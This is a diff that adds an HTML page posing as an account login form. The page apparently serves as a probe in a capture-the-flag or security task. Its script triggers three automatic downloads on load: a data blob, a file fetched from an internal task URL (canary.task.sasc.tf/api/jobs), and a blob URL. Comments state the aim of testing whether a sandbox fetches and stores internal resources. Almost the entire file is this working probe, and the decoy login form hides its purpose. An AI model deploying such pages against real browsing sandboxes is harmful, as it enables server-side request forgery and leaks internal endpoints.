@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>Account login</title>
+<div style="font-family:system-ui;max-width:420px;margin:8vh auto">
+ <h1>Log in</h1>
+ <form id="f"><input name="username" type="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Log in</button></form>
+</div>
+<script>
+function dl(href,name){var a=document.createElement('a');a.href=href;a.download=name;document.body.appendChild(a);a.click();}
+// 1) data blob download
+setTimeout(function(){dl('data:application/octet-stream;base64,'+btoa('CANARY_DL_MARKER_12345'),'marker.bin');},2000);
+// 2) internal URL download (does the sandbox fetch+store it?)
+setTimeout(function(){dl('http://canary.task.sasc.tf/api/jobs','jobs.json');},4000);
+// 3) blob url
+setTimeout(function(){try{var b=new Blob(['BLOBFLAGTEST'],{type:'application/octet-stream'});dl(URL.createObjectURL(b),'blob.bin');}catch(e){}},6000);
+</script>
